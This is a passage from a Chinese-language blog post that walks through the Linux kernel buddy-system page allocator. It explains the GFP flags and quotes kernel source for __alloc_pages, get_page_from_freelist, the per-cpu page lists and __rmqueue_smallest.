&#123;\tunsigned long flags;\tunion &#123;\t\tstruct &#123;\t\t\tunion &#123;\t\t\t\tstruct list_head lru;\t// ... ...&#125; _struct_page_alignment;\n\npage 结构体中的 lru 这一字段的类型为 struct list_head，这是内核编程中通用的双向链表结构，free_list与lru链表都使用该字段将页结构体组织为双向链表，即一个页是不可能同时出现在lru链表与buddy system中的。\n并且可以明确看到这里是按照迁移类型进行分类的，具体前面提到过这里不详细写了。\nbuddy system页分配GFP (get free page) 标识位在 kernel memory allocation 中我们经常能见到 gfp_t 类型，其表示分配时的标志位。\n\n  内存管理区修饰符: 内存管理区修饰符主要描述从哪些内存管理区来分配内存\n\n\n\n\nflag\ndescription\n\n\n\n__GFP_DMA\n从ZONE_DMA区中分配内存\n\n\n__GFP_HIGNMEM\n从ZONE_HIGHMEM区中分配内存\n\n\n__GFP_DMA32\n从ZONE_DMA32区中分配内存\n\n\n__GFP_MOVABLE\n内存规整时可以迁移或回收页面\n\n\n\n  移动和替换修饰符: 移动和替换修饰符主要表示分配出来的页面具有的迁移属性\n\n\n\n\nflag\ndescription\n\n\n\n__GFP_RECLAIMABLE\n分配的内存页面可以回收\n\n\n__GFP_WRITE\n申请的页面会被弄成脏页\n\n\n__GFP_HARDWALL\n强制使用cpuset内存分配策略\n\n\n__GFP_THISNODE\n在指定的节点上分配内存\n\n\n__GFP_ACCOUNT\nkmemcg会记录分配过程\n\n\n\n  水位修饰符: 与水位线相关的标志位\n\n\n\n\nflag\ndescription\n\n\n\n__GFP_ATOMIC\n高优先级分配内存，分配器可以分配最低警戒水位线下的预留内存\n\n\n__GFP_HIGH\n分配内存的过程中不可以睡眠或执行页面回收动作\n\n\n__GFP_MEMALLOC\n允许访问所有的内存\n\n\n__GFP_NOMEMALLOC\n不允许访问最低警戒水位线下的系统预留内存\n\n\n\n  页面回收修饰符: 与页面回收相关的标志位\n\n\n\n\nflag\ndescription\n\n\n\n__GFP_IO\n启动物理I/O传输\n\n\n__GFP_FS\n允许调用底层FS文件系统。可避免分配器递归到可能已经持有锁的文件系统中， 避免死锁\n\n\n__GFP_DIRECT_RECLAIM\n分配内存过程中可以使用直接内存回收\n\n\n__GFP_KSWAPD_RECLAIM\n内存到达低水位时唤醒kswapd线程异步回收内存\n\n\n__GFP_RECLAIM\n表示是否可以直接内存回收或者使用kswapd线程进行回收\n\n\n__GFP_RETRY_MAYFAIL\n分配内存可以可能会失败，但是在申请过程中会回收一些不必要的内存，是整个系统受益\n\n\n__GFP_NOFAIL\n内存分配失败后无限制的重复尝试，知道分配成功\n\n\n__GFP_NORETRY\n直接页面回收或者内存规整后还是无法分配内存时，不启用retry反复尝试分配内存，直接返回NULL\n\n\n\n  行为修饰符: 与分配时的行为相关的标志位\n\n\n\n\nflag\ndescription\n\n\n\n__GFP_NOWARN\n关闭内存分配过程中的WARNING\n\n\n__GFP_COMP\n分配的内存页面将被组合成复合页compound page\n\n\n__GFP_ZERO\n返回一个全部填充为0的页面\n\n\n\n  组合类型标志: 前面描述的修饰符种过于繁多，因此linux定义了一些组合的类型标志，供开发者使用\n\n\n\n\nflag\nelement\ndescription\n\n\n\nGFP_ATOMIC\n__GFP_HIGH|__GFP_ATOMIC|__GFP_KSWAPD_RECLAIM\n分配过程不能休眠，分配具有高优先级，可以访问系统预留内存\n\n\nGFP_KERNEL\n__GFP_RECLAIM|__GFP_IO|__GFP_FS\n分配内存时可以被阻塞(即休眠)\n\n\nGFP_KERNEL_ACCOUNT\nGFP_KERNEL|__GFP_ACCOUNT\n和GFP_KERNEL作用一样，但是分配的过程会被kmemcg记录\n\n\nGFP_NOWAIT\n__GFP_KSWAPD_RECLAIM\n分配过程中不允许因直接内存回收而导致停顿\n\n\nGFP_NOIO\n__GFP_RECLAIM\n不需要启动任何的I/O操作\n\n\nGFP_NOFS\n__GFP_RECLAIM |__GFP_IO\n不会有访问任何文件系统的操作\n\n\nGFP_USER\n__GFP_RECLAIM|__GFP_IO|__GFP_FS|__GFP_HARDWALL\n用户空间的进程分配内存\n\n\nGFP_DMA\n__GFP_DMA\n从ZONE_DMA区分配内存\n\n\nGFP_DMA32\n__GFP_DMA32\n从ZONE_DMA32区分配内存\n\n\nGFP_HIGHUSER\nGFP_USER|__GFP_HIGHMEM\n用户进程分配内存，优先使用ZONE_HIGHMEM， 且这些页面不允许迁移\n\n\nGFP_HIGHUSER_MOVABLE\nGFP_HIGHUSER|__GFP_MOVABLE\n和GFP_HIGHUSER类似，但是页面可以迁移\n\n\nGFP_TRANSHUGE_LIGHT\n(GFP_HIGHUSER_MOVABLE|__GFP_COMP|__GFP_NOMEMALLOC|__GFP_NOWARN)&amp; ~__GFP_RECLAIM\n透明大页的内存分配， light表示不进行内存压缩和回收\n\n\nGFP_TRANSHUGE\nGFP_TRANSHUGE_LIGHT|__GFP_DIRECT_RECLAIM\n和GFP_TRANSHUGE_LIGHT类似，通常khugepaged使用该标志\n\n\nalloc_context结构体struct alloc_context &#123;\tstruct zonelist *zonelist;\tnodemask_t *nodemask;\tstruct zoneref *preferred_zoneref;\tint migratetype;\t/*\t * highest_zoneidx represents highest usable zone index of\t * the allocation request. Due to the nature of the zone,\t * memory on lower zone than the highest_zoneidx will be\t * protected by lowmem_reserve[highest_zoneidx].\t *\t * highest_zoneidx is also used by reclaim/compaction to limit\t * the target zone since higher zone than this index cannot be\t * usable for this allocation request.\t */\tenum zone_type highest_zoneidx;\tbool spread_dirty_pages;&#125;;\n\n这是一个分配过程中非常重要的结构体，用来表示我们单次内存分配的上下文信息。\n这里主要关注的是其中的一个成员zonelist。\nstruct zonelist &#123;\tstruct zoneref _zonerefs[MAX_ZONES_PER_ZONELIST + 1];&#125;;\n\n该成员表示在这一次的分配上下文中，我们将要操作的 zone 的列表，其为一个 zonelist 类型的结构体数组。可以看到的是其为一个 zoneref 类型的结构体数组。\nstruct zoneref &#123;\tstruct zone *zone;\t/* Pointer to actual zone */\tint zone_idx;\t\t/* zone_idx(zoneref-&gt;zone) */&#125;;\n\n而这个结构体在上文中提过，包含了一个 zone 的指针以及一个 index。\n随后再看alloc_context结构体中的preferred_zoneref成员，该成员为一个 zoneref 类型的结构体，表示优先用来进行分配的 zone。\n最后则是spread_dirty_pages成员，表示此次分配是否可能产生脏页（需要进行写回），通常分配需要写入的页会出现。\n__alloc_pages函数此函数为buddy system分配页面的核心函数，所有的页面分配 API 都是基于该函数的封装。\nstruct page *__alloc_pages(gfp_t gfp, unsigned int order, int preferred_nid,\t\t\t\t\t\t\tnodemask_t *nodemask)&#123;\tstruct page *page;\tunsigned int alloc_flags = ALLOC_WMARK_LOW;\tgfp_t alloc_gfp; /* The gfp_t that was actually used for allocation */\tstruct alloc_context ac = &#123; &#125;;\t/*\t * There are several places where we assume that the order value is sane\t * so bail out early if the request is out of bound.\t */\tif (WARN_ON_ONCE_GFP(order &gt; MAX_ORDER, gfp))\t\treturn NULL;\tgfp &amp;= gfp_allowed_mask;\t/*\t * Apply scoped allocation constraints. This is mainly about GFP_NOFS\t * resp. GFP_NOIO which has to be inherited for all allocation requests\t * from a particular context which has been marked by\t * memalloc_no&#123;fs,io&#125;_&#123;save,restore&#125;. And PF_MEMALLOC_PIN which ensures\t * movable zones are not used during allocation.\t */\tgfp = current_gfp_context(gfp);\talloc_gfp = gfp;\tif (!prepare_alloc_pages(gfp, order, preferred_nid, nodemask, &amp;ac,\t\t\t&amp;alloc_gfp, &amp;alloc_flags))\t\treturn NULL;\t/*\t * Forbid the first pass from falling back to types that fragment\t * memory until all local zones are considered.\t */\talloc_flags |= alloc_flags_nofragment(ac.preferred_zoneref-&gt;zone, gfp);\t/* First allocation attempt */\tpage = get_page_from_freelist(alloc_gfp, order, alloc_flags, &amp;ac);\tif (likely(page))\t\tgoto out;\talloc_gfp = gfp;\tac.spread_dirty_pages = false;\t/*\t * Restore the original nodemask if it was potentially replaced with\t * &amp;cpuset_current_mems_allowed to optimize the fast-path attempt.\t */\tac.nodemask = nodemask;\tpage = __alloc_pages_slowpath(alloc_gfp, order, &amp;ac);out:\tif (memcg_kmem_online() &amp;&amp; (gfp &amp; __GFP_ACCOUNT) &amp;&amp; page &amp;&amp;\t    unlikely(__memcg_kmem_charge_page(page, gfp, order) != 0)) &#123;\t\t__free_pages(page, order);\t\tpage = NULL;\t&#125;\ttrace_mm_page_alloc(page, order, alloc_gfp, ac.migratetype);\tkmsan_alloc_page(page, order, alloc_gfp);\treturn page;&#125;EXPORT_SYMBOL(__alloc_pages);\n\n函数需要传入四个参数，分别是gfp分配行为参数、order分配的物理页框的阶、preferred_nid选取的节点id、nodemask分配时可供候选的node掩码。\n因为在前面的文章中已经提到过了内存分配，不过只是从slab中分配我们也大概清楚内存分配函数一般的流程，这里也不例外。首先，检查参数合法性，并做分配前准备工作。随后进行快速分配，成功则直接返回结果。最后，若快速分配失败，则进行慢速分配。\n接下来就继续细致的开始分析函数了，进入函数会先检验order是否超过了MAX_ORDER。随后会进入到prepare_alloc_pages函数进行分配前的准备工作。\nstatic inline bool prepare_alloc_pages(gfp_t gfp_mask, unsigned int order,\t\tint preferred_nid, nodemask_t *nodemask,\t\tstruct alloc_context *ac, gfp_t *alloc_gfp,\t\tunsigned int *alloc_flags)&#123;\tac-&gt;highest_zoneidx = gfp_zone(gfp_mask);\tac-&gt;zonelist = node_zonelist(preferred_nid, gfp_mask);\tac-&gt;nodemask = nodemask;\tac-&gt;migratetype = gfp_migratetype(gfp_mask);\tif (cpusets_enabled()) &#123;\t\t*alloc_gfp |= __GFP_HARDWALL;\t\t/*\t\t * When we are in the interrupt context, it is irrelevant\t\t * to the current task context. It means that any node ok.\t\t */\t\tif (in_task() &amp;&amp; !ac-&gt;nodemask)\t\t\tac-&gt;nodemask = &amp;cpuset_current_mems_allowed;\t\telse\t\t\t*alloc_flags |= ALLOC_CPUSET;\t&#125;\tmight_alloc(gfp_mask);\tif (should_fail_alloc_page(gfp_mask, order))\t\treturn false;\t*alloc_flags = gfp_to_alloc_flags_cma(gfp_mask, *alloc_flags);\t/* Dirty zone balancing only done in the fast path */\tac-&gt;spread_dirty_pages = (gfp_mask &amp; __GFP_WRITE);\t/*\t * The preferred zone is used for statistics but crucially it is\t * also used as the starting point for the zonelist iterator. It\t * may get reset for allocations that ignore memory policies.\t */\tac-&gt;preferred_zoneref = first_zones_zonelist(ac-&gt;zonelist,\t\t\t\t\tac-&gt;highest_zoneidx, ac-&gt;nodemask);\treturn true;&#125;\n\n首先调用node_zonelist函数从preferred_nid参数指定的node中获取一个zonelist\n#define NODE_DATA(nid)\t\t(node_data[nid])static inline struct zonelist *node_zonelist(int nid, gfp_t flags)&#123;\treturn NODE_DATA(nid)-&gt;node_zonelists + gfp_zonelist(flags);&#125;\n\n进行 cpuset 相关判断与标志位设置，若是在中断上下文则直接将 nodemask 设为 cpuset_current_mems_allowed。\n最后调用 first_zones_zonelist() 设置preferred zone，大概是在zonelist中nodemask所包含的zone中 highest_zoneidx 以下的第一个 zone。\n总的来说这个函数主要做的事就是分配前的一些准备的工作，包括初始化 alloc_context 结构体、获取 zone 数组等。\nget_page_from_freelist函数根据__alloc_pages函数的流程，接下来进入的就是get_page_from_freelist函数了，而这一函数就是前面提到的快速分配路径了。\nstatic struct page *get_page_from_freelist(gfp_t gfp_mask, unsigned int order, int alloc_flags,\t\t\t\t\t\tconst struct alloc_context *ac)&#123;\tstruct zoneref *z;\tstruct zone *zone;\tstruct pglist_data *last_pgdat = NULL;\tbool last_pgdat_dirty_ok = false;\tbool no_fallback;retry:\t/*\t * Scan zonelist, looking for a zone with enough free.\t * See also cpuset_node_allowed() comment in kernel/cgroup/cpuset.c.\t */\tno_fallback = alloc_flags &amp; ALLOC_NOFRAGMENT;\tz = ac-&gt;preferred_zoneref;\tfor_next_zone_zonelist_nodemask(zone, z, ac-&gt;highest_zoneidx,\t\t\t\t\tac-&gt;nodemask) &#123;\t\tstruct page *page;\t\tunsigned long mark;\t\tif (cpusets_enabled() &amp;&amp;\t\t\t(alloc_flags &amp; ALLOC_CPUSET) &amp;&amp;\t\t\t!__cpuset_zone_allowed(zone, gfp_mask))\t\t\t\tcontinue;\t\t/*\t\t * When allocating a page cache page for writing, we\t\t * want to get it from a node that is within its dirty\t\t * limit, such that no single node holds more than its\t\t * proportional share of globally allowed dirty pages.\t\t * The dirty limits take into account the node&#x27;s\t\t * lowmem reserves and high watermark so that kswapd\t\t * should be able to balance it without having to\t\t * write pages from its LRU list.\t\t *\t\t * XXX: For now, allow allocations to potentially\t\t * exceed the per-node dirty limit in the slowpath\t\t * (spread_dirty_pages unset) before going into reclaim,\t\t * which is important when on a NUMA setup the allowed\t\t * nodes are together not big enough to reach the\t\t * global limit.  The proper fix for these situations\t\t * will require awareness of nodes in the\t\t * dirty-throttling and the flusher threads.\t\t */\t\tif (ac-&gt;spread_dirty_pages) &#123;\t\t\tif (last_pgdat != zone-&gt;zone_pgdat) &#123;\t\t\t\tlast_pgdat = zone-&gt;zone_pgdat;\t\t\t\tlast_pgdat_dirty_ok = node_dirty_ok(zone-&gt;zone_pgdat);\t\t\t&#125;\t\t\tif (!last_pgdat_dirty_ok)\t\t\t\tcontinue;\t\t&#125;\t\tif (no_fallback &amp;&amp; nr_online_nodes &gt; 1 &amp;&amp;\t\t    zone != ac-&gt;preferred_zoneref-&gt;zone) &#123;\t\t\tint local_nid;\t\t\t/*\t\t\t * If moving to a remote node, retry but allow\t\t\t * fragmenting fallbacks. Locality is more important\t\t\t * than fragmentation avoidance.\t\t\t */\t\t\tlocal_nid = zone_to_nid(ac-&gt;preferred_zoneref-&gt;zone);\t\t\tif (zone_to_nid(zone) != local_nid) &#123;\t\t\t\talloc_flags &amp;= ~ALLOC_NOFRAGMENT;\t\t\t\tgoto retry;\t\t\t&#125;\t\t&#125;\t\t/*\t\t * Detect whether the number of free pages is below high\t\t * watermark.  If so, we will decrease pcp-&gt;high and free\t\t * PCP pages in free path to reduce the possibility of\t\t * premature page reclaiming.  Detection is done here to\t\t * avoid to do that in hotter free path.\t\t */\t\tif (test_bit(ZONE_BELOW_HIGH, &amp;zone-&gt;flags))\t\t\tgoto check_alloc_wmark;\t\tmark = high_wmark_pages(zone);\t\tif (zone_watermark_fast(zone, order, mark,\t\t\t\t\tac-&gt;highest_zoneidx, alloc_flags,\t\t\t\t\tgfp_mask))\t\t\tgoto try_this_zone;\t\telse\t\t\tset_bit(ZONE_BELOW_HIGH, &amp;zone-&gt;flags);check_alloc_wmark:\t\tmark = wmark_pages(zone, alloc_flags &amp; ALLOC_WMARK_MASK);\t\tif (!zone_watermark_fast(zone, order, mark,\t\t\t\t       ac-&gt;highest_zoneidx, alloc_flags,\t\t\t\t       gfp_mask)) &#123;\t\t\tint ret;\t\t\tif (has_unaccepted_memory()) &#123;\t\t\t\tif (try_to_accept_memory(zone, order))\t\t\t\t\tgoto try_this_zone;\t\t\t&#125;#ifdef CONFIG_DEFERRED_STRUCT_PAGE_INIT\t\t\t/*\t\t\t * Watermark failed for this zone, but see if we can\t\t\t * grow this zone if it contains deferred pages.\t\t\t */\t\t\tif (deferred_pages_enabled()) &#123;\t\t\t\tif (_deferred_grow_zone(zone, order))\t\t\t\t\tgoto try_this_zone;\t\t\t&#125;#endif\t\t\t/* Checked here to keep the fast path fast */\t\t\tBUILD_BUG_ON(ALLOC_NO_WATERMARKS &lt; NR_WMARK);\t\t\tif (alloc_flags &amp; ALLOC_NO_WATERMARKS)\t\t\t\tgoto try_this_zone;\t\t\tif (!node_reclaim_enabled() ||\t\t\t    !zone_allows_reclaim(ac-&gt;preferred_zoneref-&gt;zone, zone))\t\t\t\tcontinue;\t\t\tret = node_reclaim(zone-&gt;zone_pgdat, gfp_mask, order);\t\t\tswitch (ret) &#123;\t\t\tcase NODE_RECLAIM_NOSCAN:\t\t\t\t/* did not scan */\t\t\t\tcontinue;\t\t\tcase NODE_RECLAIM_FULL:\t\t\t\t/* scanned but unreclaimable */\t\t\t\tcontinue;\t\t\tdefault:\t\t\t\t/* did we reclaim enough */\t\t\t\tif (zone_watermark_ok(zone, order, mark,\t\t\t\t\tac-&gt;highest_zoneidx, alloc_flags))\t\t\t\t\tgoto try_this_zone;\t\t\t\tcontinue;\t\t\t&#125;\t\t&#125;try_this_zone:\t\tpage = rmqueue(ac-&gt;preferred_zoneref-&gt;zone, zone, order,\t\t\t\tgfp_mask, alloc_flags, ac-&gt;migratetype);\t\tif (page) &#123;\t\t\tprep_new_page(page, order, gfp_mask, alloc_flags);\t\t\t/*\t\t\t * If this is a high-order atomic allocation then check\t\t\t * if the pageblock should be reserved for the future\t\t\t */\t\t\tif (unlikely(alloc_flags &amp; ALLOC_HIGHATOMIC))\t\t\t\treserve_highatomic_pageblock(page, zone);\t\t\treturn page;\t\t&#125; else &#123;\t\t\tif (has_unaccepted_memory()) &#123;\t\t\t\tif (try_to_accept_memory(zone, order))\t\t\t\t\tgoto try_this_zone;\t\t\t&#125;#ifdef CONFIG_DEFERRED_STRUCT_PAGE_INIT\t\t\t/* Try again if zone has deferred pages */\t\t\tif (deferred_pages_enabled()) &#123;\t\t\t\tif (_deferred_grow_zone(zone, order))\t\t\t\t\tgoto try_this_zone;\t\t\t&#125;#endif\t\t&#125;\t&#125;\t/*\t * It&#x27;s possible on a UMA machine to get through all zones that are\t * fragmented. If avoiding fragmentation, reset and try again.\t */\tif (no_fallback) &#123;\t\talloc_flags &amp;= ~ALLOC_NOFRAGMENT;\t\tgoto retry;\t&#125;\treturn NULL;&#125;\n\n函数的流程大体如下，使用for_next_zone_zonelist_nodemask宏迭代遍历分配上下文中的zonelist中的zoneref数组对应的zone\n#define for_next_zone_zonelist_nodemask(zone, z, highidx, nodemask) \\\tfor (zone = z-&gt;zone;\t\\\t\tzone;\t\t\t\t\t\t\t\\\t\tz = next_zones_zonelist(++z, highidx, nodemask),\t\\\t\t\tzone = zonelist_zone(z))\n\n这里的next_zones_zonelist函数返回的是在nodemask的 zone 中，以当前 zone 作为起点游标的（位于或低于）highest_zoneidx 的下一个 zone。\n接下来进入循环体内部，首先会判断是否开启cpuset并检查当前 zone 是否满足 cpuset 的要求，若否，则尝试下一个 zone。\n检查当前 zone 对应 node 的脏页数量是否超出限制，若否，则尝试下一个 zone。\n若alloc_flags包含ALLOC_NOFRAGMENT但是当前 zone 非preferred zone、且对应 node 部位local node，则清除该标志位后重新开始分配，因为 locality 比避免碎片更加重要。\n后面则是对水位线的一些判断，首先是获取当前 zone 的水位线标记，若是设置了 ALLOC_NO_WATERMARKS 则直接到下一步进行分配，若水位线检查未通过，调用 node_reclaim() 进行页面回收，若回收后页面还是不足，则尝试下一个 zone。\n在经历了前面的for循环之后最终调用rmqueue函数进行正式的内存分配。\nstatic inlinestruct page *rmqueue(struct zone *preferred_zone,\t\t\tstruct zone *zone, unsigned int order,\t\t\tgfp_t gfp_flags, unsigned int alloc_flags,\t\t\tint migratetype)&#123;\tstruct page *page;\t/*\t * We most definitely don&#x27;t want callers attempting to\t * allocate greater than order-1 page units with __GFP_NOFAIL.\t */\tWARN_ON_ONCE((gfp_flags &amp; __GFP_NOFAIL) &amp;&amp; (order &gt; 1));\tif (likely(pcp_allowed_order(order))) &#123;\t\tpage = rmqueue_pcplist(preferred_zone, zone, order,\t\t\t\t       migratetype, alloc_flags);\t\tif (likely(page))\t\t\tgoto out;\t&#125;\tpage = rmqueue_buddy(preferred_zone, zone, order, alloc_flags,\t\t\t\t\t\t\tmigratetype);out:\t/* Separate test+clear to avoid unnecessary atomics */\tif ((alloc_flags &amp; ALLOC_KSWAPD) &amp;&amp;\t    unlikely(test_bit(ZONE_BOOSTED_WATERMARK, &amp;zone-&gt;flags))) &#123;\t\tclear_bit(ZONE_BOOSTED_WATERMARK, &amp;zone-&gt;flags);\t\twakeup_kswapd(zone, 0, 0, zone_idx(zone));\t&#125;\tVM_BUG_ON_PAGE(page &amp;&amp; bad_range(zone, page), page);\treturn page;&#125;\n\n函数进入之后会首先验证申请的order是否满足通过pcp申请\nstatic inline bool pcp_allowed_order(unsigned int order)&#123;\tif (order &lt;= PAGE_ALLOC_COSTLY_ORDER)\t\treturn true;#ifdef CONFIG_TRANSPARENT_HUGEPAGE\tif (order == pageblock_order)\t\treturn true;#endif\treturn false;&#125;\n\n这里的pcp指的是per-cpu pageset，这里简单介绍一下per-cpu pageset的概念（在老版本的Linux内核中这的order一般只允许为0时从pcp中申请，发现在新版本的内核中好像是小于等于3即可），在Linux系统中，存在很多阶为0的申请请求，如果每一次的申请请求都需要获取zone-&gt;lock的话，在越多的cpu核心的情况下就会出现越多的锁的竞争。为了解决这一问题，Linux采用的办法就是使用per-cpu pageset即pcp，其会一次性拿很多页存放在cpu中，并且释放的页也会继续存放在这里，等释放的页满了才会一并放回到zone中（我的理解就是一个cache）。\n在通过order的检验之后就会进入内部调用rmqueue_pcplist函数\nstatic struct page *rmqueue_pcplist(struct zone *preferred_zone,\t\t\tstruct zone *zone, unsigned int order,\t\t\tint migratetype, unsigned int alloc_flags)&#123;\tstruct per_cpu_pages *pcp;\tstruct list_head *list;\tstruct page *page;\tunsigned long __maybe_unused UP_flags;\t/* spin_trylock may fail due to a parallel drain or IRQ reentrancy. */\tpcp_trylock_prepare(UP_flags);\tpcp = pcp_spin_trylock(zone-&gt;per_cpu_pageset);\tif (!pcp) &#123;\t\tpcp_trylock_finish(UP_flags);\t\treturn NULL;\t&#125;\t/*\t * On allocation, reduce the number of pages that are batch freed.\t * See nr_pcp_free() where free_factor is increased for subsequent\t * frees.\t */\tpcp-&gt;free_count &gt;&gt;= 1;\tlist = &amp;pcp-&gt;lists[order_to_pindex(migratetype, order)];\tpage = __rmqueue_pcplist(zone, order, migratetype, alloc_flags, pcp, list);\tpcp_spin_unlock(pcp);\tpcp_trylock_finish(UP_flags);\tif (page) &#123;\t\t__count_zid_vm_events(PGALLOC, page_zonenum(page), 1 &lt;&lt; order);\t\tzone_statistics(preferred_zone, zone, 1);\t&#125;\treturn page;&#125;\n\nrmqueue_pcplist函数的基本流程就是首先获取掉pcp，随后通过order和迁移类型选择对应的list（当然在老版本的Linux内核中是不需要order的），随后调用__rmqueue_pcplist函数真正申请页。\nstatic inlinestruct page *__rmqueue_pcplist(struct zone *zone, unsigned int order,\t\t\tint migratetype,\t\t\tunsigned int alloc_flags,\t\t\tstruct per_cpu_pages *pcp,\t\t\tstruct list_head *list)&#123;\tstruct page *page;\tdo &#123;\t\tif (list_empty(list)) &#123;\t\t\tint batch = nr_pcp_alloc(pcp, zone, order);\t\t\tint alloced;\t\t\talloced = rmqueue_bulk(zone, order,\t\t\t\t\tbatch, list,\t\t\t\t\tmigratetype, alloc_flags);\t\t\tpcp-&gt;count += alloced &lt;&lt; order;\t\t\tif (unlikely(list_empty(list)))\t\t\t\treturn NULL;\t\t&#125;\t\tpage = list_first_entry(list, struct page, pcp_list);\t\tlist_del(&amp;page-&gt;pcp_list);\t\tpcp-&gt;count -= 1 &lt;&lt; order;\t&#125; while (check_new_pages(page, order));\treturn page;&#125;\n\n__rmqueue_pcplist函数的逻辑是比较清晰的，首先会判断list是否为空，如果为空则调用rmqueue_bulk函数从zone取页到pcp中，如果不为空则直接取页面随后通过check_new_pages函数进行检测，通过则直接返回页。\nstatic int rmqueue_bulk(struct zone *zone, unsigned int order,\t\t\tunsigned long count, struct list_head *list,\t\t\tint migratetype, unsigned int alloc_flags)&#123;\tunsigned long flags;\tint i;\tspin_lock_irqsave(&amp;zone-&gt;lock, flags);\tfor (i = 0; i &lt; count; ++i) &#123;\t\tstruct page *page = __rmqueue(zone, order, migratetype,\t\t\t\t\t\t\t\talloc_flags);\t\tif (unlikely(page == NULL))\t\t\tbreak;\t\t/*\t\t * Split buddy pages returned by expand() are received here in\t\t * physical page order. The page is added to the tail of\t\t * caller&#x27;s list. From the callers perspective, the linked list\t\t * is ordered by page number under some conditions. This is\t\t * useful for IO devices that can forward direction from the\t\t * head, thus also in the physical page order. This is useful\t\t * for IO devices that can merge IO requests if the physical\t\t * pages are ordered properly.\t\t */\t\tlist_add_tail(&amp;page-&gt;pcp_list, list);\t\tif (is_migrate_cma(get_pcppage_migratetype(page)))\t\t\t__mod_zone_page_state(zone, NR_FREE_CMA_PAGES,\t\t\t\t\t      -(1 &lt;&lt; order));\t&#125;\t__mod_zone_page_state(zone, NR_FREE_PAGES, -(i &lt;&lt; order));\tspin_unlock_irqrestore(&amp;zone-&gt;lock, flags);\treturn i;&#125;\n\n这里简单看一下rmqueue_bulk函数，这里会进行batch次循环通过__rmqueue函数申请page并向链表中加入。这里函数内部的__rmqueue函数留在后面一并梳理。\nstatic __always_inlinestruct page *rmqueue_buddy(struct zone *preferred_zone, struct zone *zone,\t\t\t   unsigned int order, unsigned int alloc_flags,\t\t\t   int migratetype)&#123;\tstruct page *page;\tunsigned long flags;\tdo &#123;\t\tpage = NULL;\t\tspin_lock_irqsave(&amp;zone-&gt;lock, flags);\t\tif (alloc_flags &amp; ALLOC_HIGHATOMIC)\t\t\tpage = __rmqueue_smallest(zone, order, MIGRATE_HIGHATOMIC);\t\tif (!page) &#123;\t\t\tpage = __rmqueue(zone, order, migratetype, alloc_flags);\t\t\t/*\t\t\t * If the allocation fails, allow OOM handling access\t\t\t * to HIGHATOMIC reserves as failing now is worse than\t\t\t * failing a high-order atomic allocation in the\t\t\t * future.\t\t\t */\t\t\tif (!page &amp;&amp; (alloc_flags &amp; ALLOC_OOM))\t\t\t\tpage = __rmqueue_smallest(zone, order, MIGRATE_HIGHATOMIC);\t\t\tif (!page) &#123;\t\t\t\tspin_unlock_irqrestore(&amp;zone-&gt;lock, flags);\t\t\t\treturn NULL;\t\t\t&#125;\t\t&#125;\t\t__mod_zone_freepage_state(zone, -(1 &lt;&lt; order),\t\t\t\t\t  get_pcppage_migratetype(page));\t\tspin_unlock_irqrestore(&amp;zone-&gt;lock, flags);\t&#125; while (check_new_pages(page, order));\t__count_zid_vm_events(PGALLOC, page_zonenum(page), 1 &lt;&lt; order);\tzone_statistics(preferred_zone, zone, 1);\treturn page;&#125;\n\n这里回到rmqueue函数的流程，如果申请的order不能直接通过pcp进行申请是则会进入rmqueue_buddy函数中。函数内部其会根据不同的alloc_flags通过不同的函数进行分配。\nstatic __always_inline struct page *__rmqueue(struct zone *zone, unsigned int order, int migratetype,\t\t\t\t\t\tunsigned int alloc_flags)&#123;\tstruct page *page;\tif (IS_ENABLED(CONFIG_CMA)) &#123;\t\t/*\t\t * Balance movable allocations between regular and CMA areas by\t\t * allocating from CMA when over half of the zone&#x27;s free memory\t\t * is in the CMA area.\t\t */\t\tif (alloc_flags &amp; ALLOC_CMA &amp;&amp;\t\t    zone_page_state(zone, NR_FREE_CMA_PAGES) &gt;\t\t    zone_page_state(zone, NR_FREE_PAGES) / 2) &#123;\t\t\tpage = __rmqueue_cma_fallback(zone, order);\t\t\tif (page)\t\t\t\treturn page;\t\t&#125;\t&#125;retry:\tpage = __rmqueue_smallest(zone, order, migratetype);\tif (unlikely(!page)) &#123;\t\tif (alloc_flags &amp; ALLOC_CMA)\t\t\tpage = __rmqueue_cma_fallback(zone, order);\t\tif (!page &amp;&amp; __rmqueue_fallback(zone, order, migratetype,\t\t\t\t\t\t\t\talloc_flags))\t\t\tgoto retry;\t&#125;\treturn page;&#125;\n\n先看__rmqueue函数，可以发现其内部实际调用的还是__rmqueue_smallest函数进行分配的，不过前面会判断是否分配CMA，如果是则直接调用__rmqueue_cma_fallback进行分配。\n#ifdef CONFIG_CMAstatic __always_inline struct page *__rmqueue_cma_fallback(struct zone *zone,\t\t\t\t\tunsigned int order)&#123;\treturn __rmqueue_smallest(zone, order, MIGRATE_CMA);&#125;#elsestatic inline struct page *__rmqueue_cma_fallback(struct zone *zone,\t\t\t\t\tunsigned int order) &#123; return NULL; &#125;#endif\n\n看其定义其实也只是修改了迁移类型之后调用__rmqueue_smallest函数，而整个buddy system最核心的函数就是__rmqueue_smallest函数。\nstatic __always_inlinestruct page *__rmqueue_smallest(struct zone *zone, unsigned int order,\t\t\t\t\t\tint migratetype)&#123;\tunsigned int current_order;\tstruct free_area *area;\tstruct page *page;\t/* Find a page of the appropriate size in the preferred list */\tfor (current_order = order; current_order &lt;= MAX_ORDER; ++current_order) &#123;\t\tarea = &amp;(zone-&gt;free_area[current_order]);\t\tpage = get_page_from_free_area(area, migratetype);\t\tif (!page)\t\t\tcontinue;\t\tdel_page_from_free_list(page, zone, current_order);\t\texpand(zone, page, order, current_order, migratetype);\t\tset_pcppage_migratetype(page, migratetype);\t\ttrace_mm_page_alloc_zone_locked(page, order, migratetype,\t\t\t\tpcp_allowed_order(order) &amp;&amp;\t\t\t\tmigratetype &lt; MIGRATE_PCPTYPES);\t\treturn page;\t&#125;\treturn NULL;&#125;\n\n希望各位还记得在前文struct zone段的内容，这里用文字给大家简要的回忆一下，如果记不起来最好可以点旁边的大纲看看图片。在zone中存在free_area字段用以存储buddy system按照 order 管理的页面，为一个 free_area 结构体数组，而其索引就是页所对应的order。并且free_area本身就是一个结构体，内部存在一个free_list成员其索引对应的是不同的迁移类型。\n在经过简单的回忆之后我们继续看__rmqueue_smallest函数，这里会从传入的order开始进行循环，并且通过order在zone中找到对应的free_area，随后通过迁移类型获取到对应的页。在获取到对应的页之后就会进行断链操作，这里重点看一下expand函数\nstatic inline void expand(struct zone *zone, struct page *page,\tint low, int high, int migratetype)&#123;\tunsigned long size = 1 &lt;&lt; high;\twhile (high &gt; low) &#123;\t\thigh--;\t\tsize &gt;&gt;= 1;\t\tVM_BUG_ON_PAGE(bad_range(zone, &amp;page[size]), &amp;page[size]);\t\t/*\t\t * Mark as guard pages (or page), that will allow to\t\t * merge back to allocator when buddy will be freed.\t\t * Corresponding page table entries will not be touched,\t\t * pages will stay 